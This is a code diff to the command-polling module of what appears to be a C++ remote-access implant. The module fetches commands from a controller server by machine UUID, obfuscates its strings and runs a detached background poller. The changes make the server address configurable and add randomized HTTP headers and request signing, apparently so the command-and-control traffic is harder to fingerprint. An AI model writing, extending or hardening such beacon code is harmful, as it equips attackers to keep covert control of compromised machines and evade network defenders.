@@ -19,17 +19,22 @@ void CommandHandler::poll() {
     enum State { FETCH, PROCESS, SLEEP, DONE } state = FETCH;
     CURL* curl = curl_easy_init();
     if(!curl) return;
+    struct curl_slist* headers = nullptr;
     std::string resp;
     while(state != DONE) {
         switch(state) {
         case FETCH: {
             if(g_safe_mode.load() || g_deep_sleep.load()) { state = DONE; break; }
-            std::string url = server_ + OBFUSCATE("/commands/") + g_uuid;
+            std::string url = server_ + g_agent_config.path_prefix + OBFUSCATE("/commands/") + g_uuid;
             resp.clear();
+            headers = g_header_randomizer.build_list();
+            headers = g_request_signer.sign(headers, "GET", url, "");
+            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
             curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
             curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
             curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
             CURLcode res = curl_easy_perform(curl);
+            curl_slist_free_all(headers);
             state = (res == CURLE_OK && !resp.empty()) ? PROCESS : SLEEP;
             break; }
         case PROCESS: {
@@ -63,4 +68,4 @@ void CommandHandler::init() {
     poller_.detach();
 }
 
-extern "C" Module* create_module() { return new CommandHandler(OBFUSCATE("http://localhost:5000")); }
+extern "C" Module* create_module() { return new CommandHandler(g_agent_config.server_url); }
